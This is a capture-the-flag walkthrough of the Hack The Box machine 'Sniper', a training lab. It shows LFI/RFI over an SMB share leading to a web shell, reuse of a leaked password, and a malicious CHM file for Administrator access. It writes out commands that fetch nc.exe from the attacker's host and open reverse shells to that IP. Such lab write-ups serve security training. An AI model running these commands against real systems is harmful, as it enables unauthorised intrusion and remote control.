---
date: 2025-02-18
categories: [CTF, HTB]
title: "HTB - Sniper"
tags: ['ftp', 'impacket', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'smb', 'webshell', 'windows']

description: "Sniper - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Sniper

```bash
nmap 10.129.229.6 -p-
```

![image1](../resources/b0823e0d51b9450f857133a21719c4f4.png)

```bash
nmap 10.129.229.6 -A -p 80,135,139,445,49667
```

![image2](../resources/f01b83f612f5420e9951af814b32cd61.png)

- By selecting a language:

![image3](../resources/9bfd324d519442bf937e248f39b85720.png)

- We can see that a .php file gets included

- This could be a potential LFI (Local File Inclusion)

- We add a known Windows file into the path
  - /Windows\System32\drivers\etc\hosts
  - /windows/win.ini

**(Don't include C:\\ Just add a forward slash / to represent the root directory**


![image4](../resources/1746e4369e2048c6b9ab1ff4abd358eb.png)

And the response:

![image5](../resources/ef9030bf4cc041df9c4fd2532e7e206a.png)

- We can try RFI through http ie. ?lang=//10.10.14.84/test.php
But in the PHP configuration file, "**allow_url_include**" wrapper **by-default set to "Off"** which instruct PHP not to load remote HTTP or FTP URLs

**But it doesn't include SMB**

**<u>Exploit:</u>**
[https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

- Create a file to test (displays php server info):
```bash
echo "<?php phpinfo(); ?>" | tee /tmp/share/test.php

```

- Tried it with impacket-smbserver but we get a connection and it closes

- So following the link above:
```bash
sudo su
apt install samba
mkdir /tmp/share
chmod 0555 /tmp/share
chown -R nobody:nogroup /tmp/share
cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
echo \> /etc/samba/smb.conf
nano /etc/samba/smb.conf

```

<u>Enter the below into smb.conf:</u>

```bash
[global]

workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[share]
path = /tmp/share
writable = yes
guest ok = yes
guest only = yes
read only = no
directory mode = 0555
force user = nobody
```

```bash
service smbd restart
```
- Note: The **\[share\]** is the sharename
So we have to go to **?lang=\\10.10.14.84\share\test.php**


![image6](../resources/4036e457ef704831bf4c0c0433abe9b3.png)

It worked!

- Now let's get an interactive web shell:
```bash
git clone https://github.com/incredibleindishell/Mannu-Shell.git
cd Mannu-Shell
cp mannu.php /tmp/share

```
**/blog/?lang=\\10.10.14.84\share\mannu.php**


![image7](../resources/5a285eb9a22a4d58b597168183d1c199.png)

We get this weird looking indi web shell

- We can execute commands:

![image8](../resources/f1d4373b3e13496d8882e38daca7bce9.png)

Create a Powershell reverse shell from revshells and execute:


![image9](../resources/ef5dbdfd001141aeae6206c764929558.png)

We get a more stable shell as user **iusr**:


![image10](../resources/6e8f99e8173a46b89951dc8feb4947f4.png)


![image11](../resources/3db899fe59d44200807503c0a9fdf95a.png)

SeImpersonatePrivilege is set
- But I can't exploit that here

Moving on:
- We get credentials in **C:\inetpub\wwwroot\user\db.php**

![image12](../resources/e5e14b52a760451dbdb920ed1b7229fe.png)

**36mEAhz/B8xQ~2VM**

- There is another user - Chris

![image13](../resources/01f20af06aa843e68f07e96bd5336f5c.png)

- We can check if the credentials were reused:
```bash
crackmapexec smb 10.129.202.21 -u "chris" -p '36mEAhz/B8xQ~2VM'

```

![image14](../resources/55027208299e4240b7cd749dc76848a9.png)

- Checking with powershell:

```bash
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;

```

![image15](../resources/3ea1bcd8001c426f8a4ef58e29f74908.png)

- Now we know the credentials are being reused - we can try and get a shell:
**(Msfvenom generated payloads didn't work - only nc.exe worked)**

- Get nc.exe ready
- Start a python http server and a nc listener

```bash
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.84/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.84 4444} -credential $credential;

```
**or**

```bash
invoke-command -computer sniper -scriptblock { C:\Users\chris\nc.exe 10.10.14.84 1234 -e powershell.exe } -credential $cred

```

![image16](../resources/f63c862f58734ca09008ed61b556c103.png)

- Got a shell as Chris:

![image17](../resources/4906d7dcef4a45b8be5f661c8633da5d.png)

Looking through the folders, there is a file in Chris' Downloads folder


![image18](../resources/5bc4ecccf002498b822b783c56b253aa.png)

Also, in the C:\\ root directory, there is a Docs folder with some files


![image19](../resources/bed0b474e72247da86751d3c7e88db42.png)

We can read the note.txt file:


![image20](../resources/59ac772837314e7688d40561c52fa705.png)

But the other two files, can't be read on here, so we need to transfer them to our machine:

I tried to use the Samba SMB share but it kept saying Access Denied.

So I stopped the smbd service. And started impacket-smbserver in the directory


![image21](../resources/0f1fa70bac96487f877121b67a033da9.png)


![image22](../resources/9fd3e68c190e4cceb07e2654e3e6c27e.png)

I opened the instructions.chm on a Windows VM:


![image23](../resources/ea267fdc263b4c7689884e526c83b22e.png)

**<u>Exploit:</u>**

Following this guide, we can create a malicious .chm file:

[https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e](https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e)

- Open a Windows VM
- Download HTML Help Workshop and Documentation program (if not already installed)
- Download the Out-CHM.ps1 module (or copy and paste):
<https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1>

- Open PS as admin and run:
```powershell
Set-ExecutionPolicy Unrestricted
Import-Module .\Out-CHM.ps1
out-chm -Payload "C:\Users\chris\nc.exe -e cmd.exe 10.10.14.84 4445" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

![image24](../resources/652b6c86103b4b7391c80a8562fcb169.png)

- Copy the create doc.chm back to the Kali VM and host an SMB share
- Now copy the doc.chm file from Kali to the victim machine C:\Docs folder

- Set up a listener on the port you specified

- And we have a shell back from the Administrator and can read root.txt:

![image25](../resources/6a6f4483d5d541e191d495b2ffb0df47.png)